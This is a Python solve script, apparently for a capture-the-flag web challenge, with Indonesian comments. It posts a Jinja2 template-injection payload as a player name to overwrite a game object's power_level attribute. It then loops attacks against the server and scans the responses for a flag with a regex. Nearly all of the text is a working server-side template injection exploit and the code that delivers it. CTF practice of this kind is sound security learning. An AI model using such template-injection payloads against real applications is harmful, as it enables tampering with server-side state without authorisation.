import requests
import re
import time

URL = "http://chals1.apoorvctf.xyz:3001"

def solve():
    s = requests.Session()
    
    # 1. Injeksi Power Level
    payload = "{% set _ = player.__dict__.update(power_level=999999999999) %}Goku"
    print(f"[*] Mengirim payload untuk meretas Power Level...")
    s.post(f"{URL}/", data={"name": payload})
    
    # 2. Loop Serangan
    print("[*] Memasuki Arena dan memulai pembantaian...")
    for stage in range(1, 6): # Asumsi ada max 5 stage
        print(f"[*] 🤜 Menyerang musuh di Stage {stage}...")
        res = s.post(f"{URL}/attack")
        print(f"    Hasil: {res.text}")
        
        # Cek apakah flag langsung keluar di hasil attack
        if "{" in res.text:
            print(f"\n[+] Flag Ditemukan di response: {res.text}")
            return
            
        if res.text == "WIN":
            # Cek apakah flag dirender di halaman arena setelah menang
            arena_html = s.get(f"{URL}/arena").text
            flag_match = re.search(r'(apoorvctf\{.*?\}|upctf\{.*?\})', arena_html, re.IGNORECASE)
            
            if flag_match:
                print(f"\n[+] 🏆 Flag Ditemukan di Arena: {flag_match.group(0)}")
                return
        else:
            print("[-] Pertarungan selesai atau terjadi error.")
            break
            
        time.sleep(0.5)

if __name__ == "__main__":
    solve()
